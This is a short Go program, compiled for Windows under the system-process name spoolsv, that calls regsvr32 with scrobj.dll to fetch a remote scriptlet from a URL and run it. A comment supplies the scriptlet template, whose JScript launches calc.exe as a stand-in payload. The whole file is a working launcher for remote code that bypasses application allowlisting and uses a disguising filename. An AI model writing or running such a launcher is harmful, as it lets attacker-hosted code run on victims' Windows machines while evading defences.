package main
import(
	"fmt"
	"os/exec"
)
//Compile with: env GOOS=windows GOARCH=386 go build spoolsv.go
//<URL> hosted file needs to be XML format. Template:
//=========================================================================
//<?XML version="1.0"?>
//<scriptlet>
//<registration
//	<script language="JScript">
//		<![CDATA[
//			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
//		]]>
//</script>
//</registration>
//</scriptlet>
//==========================================================================


func main(){
	c := exec.Command("regsvr32", "/s", "/n", "/u", "/i:<URL>", "scrobj.dll")
 
if err := c.Run(); err != nil {
	fmt.Println("Error: ", err)
	}
}       

